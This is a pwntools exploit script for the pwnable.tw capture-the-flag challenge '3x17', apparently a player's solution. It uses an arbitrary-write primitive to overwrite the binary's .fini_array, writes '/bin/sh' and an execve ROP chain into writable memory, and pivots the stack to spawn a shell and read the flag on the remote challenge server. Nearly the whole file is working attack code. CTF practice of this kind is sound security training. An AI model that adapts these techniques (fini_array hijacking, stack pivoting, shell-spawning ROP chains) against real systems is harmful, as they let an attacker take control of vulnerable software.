
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

import IPython
from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./3x17')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# target record-full # Not supported with AVX instructions yet

# Break in fini()
# b *0x402988

# Break in main()
# b *0x401b6d

# Break in reading
# b *0x00401bc1

# Break in `leave; ret;` of main
# b *0x00401c4b

# Break in fini()
# b *0x0000402960

# break at the end of the `if (byte == 1)` case in main()
# b *0x401c33

# break in syscall gadget
b *0x0471db5

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'chall.pwnable.tw'
    remote_port = 10105
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

syscall_gadget   = 0x0471db5   # syscall; ret;
leave_ret_gadget = 0x0401c4b   # leave; ret;
nop_gadget = 0x401c4c # ret;
rdi_gadget = 0x401696 # pop rdi; ret;
rsi_gadget = 0x406c30 # pop rsi; ret;
rdx_gadget = 0x446e35 # pop rdx; ret;
rax_gadget = 0x41e4af # pop rax; ret;

# [0x4b4000 0x4ba000) rw-
main_addr  = 0x00401b6d
fini_addr  = 0x00402960
fini_array = 0x004b40f0
fini_array_elems = 2

def chop_bytes(bs, interval):
    return [bs[i:i+interval] for i in range(0, len(bs), interval)]

def arbitrary_write(addr, data):
    assert(len(data) <= 0x18)
    io.sendlineafter(b'addr:', f'{addr}'.encode())
    if len(data) == 0x18:
        io.sendafter(b'data:', data)
    else:
        io.sendlineafter(b'data:', data)

arbitrary_write(fini_array, p64(fini_addr) + p64(main_addr)) # First invoke main() and then recursively invoke fini()

#### Fake stack goes here ####
data_addr = 0x4b93b0
arbitrary_write(data_addr, b'/bin/sh\x00' + p64(data_addr) + p64(0x00))

fake_stack_addr = 0x4b4100
payload  = b''
payload += (
    p64(rax_gadget) +
    p64(59)
)
payload += (
    p64(rdi_gadget) +
    p64(data_addr)
)
payload += (
    p64(rsi_gadget) + 
    p64(data_addr+0x08)
)
payload += (
    p64(rdx_gadget) +
    p64(0x00)
)
payload += (
    p64(syscall_gadget)
)

payload_chops = chop_bytes(payload, 0x18)
for i,chop in enumerate(payload_chops):
    log.debug("Sendig chop {}/{}".format(i+1, len(payload_chops)))
    arbitrary_write(fake_stack_addr+i*0x18, chop)
##############################

arbitrary_write(fini_array-8, b'A'*8 + p64(leave_ret_gadget) + p64(nop_gadget)) # stack pivot

# Get the flag
if args['REMOTE']:
    io.sendline(b'cat /home/3x17/the_4ns_is_51_fl4g')
    print(io.recvline().decode('ascii'))

log.success('Shell popped!')
io.interactive()
io.close()
